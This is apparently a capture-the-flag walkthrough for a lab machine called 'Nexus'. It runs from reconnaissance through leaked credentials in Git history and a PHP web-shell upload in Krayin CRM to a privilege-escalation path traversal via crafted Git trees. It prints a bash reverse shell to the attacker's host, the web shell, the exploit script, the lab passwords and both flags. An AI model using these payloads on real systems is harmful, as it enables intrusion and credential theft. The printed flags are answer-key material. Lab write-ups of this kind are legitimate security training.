# Nexus Machine - Step-by-Step Solution Guide

## Phase 1: Reconnaissance & Enumeration
1. **Network Scanning:**
   Start with an Nmap scan to identify open ports and services.
   ```bash
   nmap -sC -sV -oN nmap_scan.txt 10.129.36.63
   ```
   *Results:*
   * Port 22 (SSH) - OpenSSH 9.6p1
   * Port 80 (HTTP) - nginx 1.24.0 (Redirects to `http://nexus.htb/`)

2. **Virtual Host Brute Forcing:**
   Since the main page redirects to `nexus.htb` and returns a standard landing page, we brute-force subdomains (vhosts) using `ffuf` and filter out the wildcard `302` redirect size (`154` bytes).
   ```bash
   ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.36.63/ -H "Host: FUZZ.nexus.htb" -fs 154 -o ffuf_vhost.json
   ```
   *Results:*
   * **`git.nexus.htb`** (Status 200) - Running Gitea v1.26.0
   * **`billing.nexus.htb`** (Status 302 -> `/admin/login`) - Running Krayin CRM (Laravel-based)

---

## Phase 2: Gaining Initial Access
1. **Source Code Disclosure (Gitea):**
   Navigate to Gitea (`git.nexus.htb/explore/repos`) and discover a public repository: **`admin/krayin-docker-setup`**.
   
2. **Leaked Credentials in Git History:**
   Clone the repository and inspect the Git commit logs.
   ```bash
   git clone http://git.nexus.htb/admin/krayin-docker-setup.git
   git log -p
   ```
   *Leaked Database Password:* **`N27xh!!2ucY04`** (re-written in a commit to empty).

3. **Admin Authentication (Krayin CRM):**
   Test the leaked password on Krayin CRM (`billing.nexus.htb/admin/login`) using the candidate emails. The hiring manager's email is found on the main site.
   * **Username:** `j.matthew@nexus.htb`
   * **Password:** `N27xh!!2ucY04`
   * **Result:** Successful login to the Krayin CRM admin dashboard.

4. **Exploiting CVE-2026-36340 (Remote Code Execution):**
   Krayin CRM (versions <= 2.1.5) is vulnerable to authenticated arbitrary file upload via email attachments.
   * **Action:** Send an email from the dashboard (`/admin/mail/create`) to `careers@nexus.htb` and attach a PHP web shell (`shell.php`):
     ```php
     <?php system($_GET['cmd']); ?>
     ```
   * **Location of Shell:** The uploaded attachment is saved in a publicly accessible directory:
     `http://billing.nexus.htb/storage/emails/1/shell.php`
   * **Trigger Shell:** Command execution confirmed:
     `http://billing.nexus.htb/storage/emails/1/shell.php?cmd=id` (returns `uid=33(www-data)`)

5. **Establishing a Reverse Shell:**
   Set up a local listener:
   ```bash
   nc -lvnp 9001
   ```
   Trigger the reverse shell via the web shell:
   ```bash
   curl -H "Host: billing.nexus.htb" "http://10.129.36.63/storage/emails/1/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.106%2F9001%200%3E%261%22"
   ```
   *Result:* Obtained interactive shell as `www-data`.

---

## Phase 3: Lateral Movement
1. **Extracting Active Credentials:**
   Read Krayin CRM's active `.env` file on the server (`/var/www/krayin/.env`) to find the live database password.
   * **Active Password:** **`y27xb3ha!!74GbR`**

2. **Switching to User `jones`:**
   Spawn a PTY shell and switch users:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   su jones
   # Password: y27xb3ha!!74GbR
   ```
   *Result:* Logged in as `jones`.
   * **User Flag:** `bddadc696be9185aa5864aab6d659c0f`

---

## Phase 4: Privilege Escalation
1. **Exploiting Gitea Template Sync Path Traversal:**
   The system runs a background template sync service (logged at `/var/log/template-sync.log`) that pulls template repositories from Gitea. The service is vulnerable to path traversal.

2. **Creating the Traversal Repository:**
   Log in to Gitea as `jones:y27xb3ha!!74GbR` and create a repository named `rce`.
   Mark it as a **template repository** via the Gitea API:
   ```bash
   curl -u "jones:y27xb3ha!!74GbR" -X PATCH -H "Content-Type: application/json" -d '{"template": true}' http://127.0.0.1:3000/api/v1/repos/jones/rce
   ```

3. **Crafting the Traversal Commit:**
   Create a nested Git tree structure locally that contains a `..` entry pointing to `root/.ssh/authorized_keys` containing our SSH public key, bypassing standard Git client path blocks.
   ```python
   # Run python script inside cloned rce repo
   blob = write_obj(public_key, "blob")
   ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
   cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
   fir = write_obj(entry("40000", "root", cur), "tree")
   for i in range(4):
       fir = write_obj(entry("40000", "..", fir), "tree")
   root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
   ```

4. **Pushing the Exploit:**
   ```bash
   git push -u origin main --force
   ```

5. **SSH Root Access:**
   Once the cron sync service runs (every minute), it writes our public key to `/root/.ssh/authorized_keys`. We SSH directly into the target as root:
   ```bash
   ssh -i id_rsa root@10.129.36.63
   ```
   *Result:* Root shell obtained!
   * **Root Flag:** `93115a1d5e69b56bedd1b66f01540809`
